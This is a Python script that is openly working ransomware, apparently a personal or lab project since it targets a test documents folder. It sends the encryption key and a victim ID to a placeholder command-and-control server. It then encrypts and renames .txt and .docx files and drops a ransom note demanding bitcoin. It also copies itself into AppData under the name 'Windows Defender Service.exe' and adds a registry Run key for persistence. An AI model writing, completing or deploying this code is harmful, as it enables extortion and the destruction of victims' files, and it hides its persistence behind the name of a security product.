import os
import pathlib
import base64
import shutil
import winreg
import random
import string
import time
import requests
from Encryptor import generate_key, save_key, load_key, encrypt_data

# === CONFIGURATION ===
EXTENSIONS_TO_ENCRYPT = ['.txt', '.docx']
MAX_FILE_SIZE_MB = 5
TARGET_DIR = os.path.join("C:", os.sep, "Users", "prana", "OneDrive", "Documents", "python_test_docs")
ENCRYPTED_EXT = ".enc"
C2_URL = "https://yourserver.com/newkey"  # CHANGE to your real C2 server
TIMEOUT_SECONDS = 10

# === HELPER FUNCTIONS ===
def generate_random_id(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def send_keys_to_server(victim_id, encryption_key):
    payload = {
        "id": victim_id,
        "enckey": encryption_key
    }
    
    start_time = time.time()
    
    while True:
        try:
            response = requests.post(C2_URL, json=payload, timeout=5)
            if response.status_code in [200, 204]:
                print("Keys successfully sent to C2 server.")
                return True
            else:
                print(f"Server responded with {response.status_code}: {response.text}")
        except Exception as e:
            print(f"Error contacting server: {e}")
        
        if time.time() - start_time > TIMEOUT_SECONDS:
            print("Timeout reached. Moving on...")
            return False
        
        time.sleep(2)

def scan_and_encrypt_files(target_folder, key):
    encrypted_files = []
    """Scan the target folder for files to encrypt."""
    for root, dirs, files in os.walk(target_folder):
        for file in files:
            file_path = os.path.join(root, file)
            ext = pathlib.Path(file).suffix.lower()
            if ext not in EXTENSIONS_TO_ENCRYPT:
                continue
            
            size_mb = os.path.getsize(file_path) / (1024 * 1024)
            if size_mb > MAX_FILE_SIZE_MB:
                print(f"Skipping {file_path}: file size exceeds {MAX_FILE_SIZE_MB} MB")
                continue
            
            try:
                with open(file_path, 'rb') as f:
                    content = f.read()
                
                encrypted_content = encrypt_data(content, key)
                with open(file_path, 'wb') as f:
                    f.write(encrypted_content)
                
                filename_only = os.path.basename(file_path)
                encoded_name = base64.b64encode(filename_only.encode()).decode()
                new_filename = encoded_name + ENCRYPTED_EXT
                new_filepath = os.path.join(root, new_filename)
                
                os.rename(file_path, new_filepath)  # << Renaming here
                encrypted_files.append(new_filepath)
                
                print(f"Encrypted and renamed: {new_filepath}")
            
            except Exception as e:
                print(f"Error encrypting {file_path}: {e}")
    
    return encrypted_files

def add_to_startup(executable_path, app_name="Windows Defender Service"):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, executable_path)
        winreg.CloseKey(key)
        print(f"Added {app_name} to startup.")
    except Exception as e:
        print(f"Error adding to startup: {e}")

# === MAIN EXECUTION ===
if __name__ == "__main__":
    # Step 1: Generate Key
    key = generate_key()
    save_key(key, "key.key")
    
    # Step 2: Generate Victim ID and Send to C2
    victim_id = generate_random_id()
    success = send_keys_to_server(victim_id, base64.urlsafe_b64encode(key).decode())
    if not success:
        print("Warning: Could not contact C2. Proceeding anyway.")
    
    # Step 3: Encrypt Files
    encrypted_files = scan_and_encrypt_files(TARGET_DIR, key)
    print("\nEncryption complete")
    print(f"Encrypted {len(encrypted_files)} files.")

    # Step 4: Drop Ransom Note
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    ransom_id = base64.urlsafe_b64encode(key).decode()
    btc_price = 50
    wallet_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    contact_email = "give_me_ransom@gmail.com"
    
    ransom_note = f"""
    <html><body><pre>
    ALL YOUR FILES HAVE BEEN ENCRYPTED!

    YOUR IDENTIFICATION CODE: {ransom_id}

    SEND {btc_price} BTC TO THE FOLLOWING ADDRESS:
    {wallet_address}

    AFTER PAYMENT, EMAIL US AT:
    {contact_email}

    SEND YOUR IDENTIFICATION CODE AND PAYMENT PROOF TO RECEIVE THE DECRYPTION KEY.
    </pre></body></html>
    """
    ransom_note_path = os.path.join(desktop_path, "RANSOM_NOTE.html")
    with open(ransom_note_path, "w", encoding='utf-8') as f:
        f.write(ransom_note)
    
    print(f"Ransom note written to {ransom_note_path}")

    # Step 5: Drop Encrypted Files List
    files_list_content = "<html><body><h1>Encrypted Files</h1><ul>"
    for file_path in encrypted_files:
        files_list_content += f"<li>{file_path}</li>"
    files_list_content += "</ul></body></html>"
    
    files_list_path = os.path.join(desktop_path, "FILES_LIST.html")
    with open(files_list_path, "w", encoding='utf-8') as f:
        f.write(files_list_content)
    
    print(f"Files list written to {files_list_path}")

    # Step 6: Copy Script to Hidden Location and Add to Startup
    hidden_dir = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows")
    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)
    
    current_script_path = os.path.abspath(__file__)
    copied_script_path = os.path.join(hidden_dir, "Windows Defender Service.exe")
    
    try:
        shutil.copy2(current_script_path, copied_script_path)
        print(f"Copied script to {copied_script_path}")
    except Exception as e:
        print(f"Error copying script: {e}")
    
    add_to_startup(copied_script_path)
